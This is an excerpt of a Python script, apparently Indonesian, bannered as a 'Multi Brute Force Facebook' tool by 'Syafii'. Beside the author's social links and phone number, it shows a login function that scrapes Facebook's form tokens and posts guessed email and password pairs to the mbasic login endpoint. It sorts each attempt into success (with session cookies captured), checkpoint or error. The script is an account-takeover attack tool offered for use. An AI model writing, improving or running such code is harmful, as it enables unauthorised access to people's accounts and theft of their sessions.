...
Facebook  = 'Facebook.com/fikrirampan305'
Instagram = 'Instagram.com/fikri.sinaga'
Whatsapp  = '082245780524'
YouTube   = 'Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA'
Version   = '0.5'
Syafii  = 100004623370585
Postingan = 105535092943936
...
log_IP = Syafii * id_dev - 101816210
###----------[ GLOBAL URL & HEADERS ]---------- ###
...
def poster():
    ...
    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sSyafii     '%(P,J,Version,P,J))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
def poster2():
    l1 = ('     %s  _________       __                          '%(P))
    ...
    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sSyafii     '%(P,H,Version,P,H))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
def poster3():
    l1 = ('     %s  _________       __                          '%(P))
    ...
    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sSyafii     '%(P,B,Version,P,B))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
...
def logger3(user,pasw): #--- Login Instagram ---#
    ...
    with requests.Session() as xyz:
        if ip_log != 1:
            ...
            log  = {"lsd":re.search('name="lsd" value="(.*?)"',str(req.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),"email":user,"pass":pasw}
            head = {"Host":url_login,"origin":"https://"+url_login,"user-agent":ua,"sec-fetch-site":"same-origin"}
            exec = xyz.post(f'https://{url_login}/login/device-based/regular/login/?api_key=1946312052199555&skip_api_login=1&signed_next=1&next=https://mbasic.facebook.com/dialog/oauth?app_id=1946312052199555&refsrc=deprecated&app_id=1946312052199555&lwv=100&refid=9', data=log, headers=head)
            if 'c_user' in xyz.cookies.get_dict(): return {"status":"ok","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            elif 'checkpoint' in xyz.cookies.get_dict(): return {"status":"cp","email":user,"pass":pasw,"cookies":xyz.cookies.get_dict()}
            else: return {"status":"error","email":user,"pass":pasw}
